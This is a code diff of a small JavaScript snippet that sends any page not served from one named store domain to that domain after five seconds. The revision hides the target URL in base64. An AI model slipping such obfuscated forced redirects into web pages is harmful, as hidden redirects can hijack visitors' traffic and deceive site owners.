@@ -1,9 +1,16 @@
-    function checkDomain() {
-        const currentDomain = window.location.hostname;
-        if (currentDomain !== "bharatainternasional.store") {
+(function() {
+    const encodedUrl = "aHR0cHM6Ly9iaGFyYXRhaW50ZXJuYXNpb25hbC5zdG9yZQ==";
+    const delay = 5 * 1000;
+    const currentHost = window.location.hostname;
+    const destination = atob(encodedUrl).replace("https://", "");
+
+    function initiate() {
+        if (currentHost !== destination) {
             setTimeout(() => {
-                window.location.href = "https://bharatainternasional.store";
-            }, 5000);
+                window.location.href = atob(encodedUrl);
+            }, delay);
         }
     }
-    window.onload = checkDomain;
+
+    window.addEventListener('load', initiate);
+})();
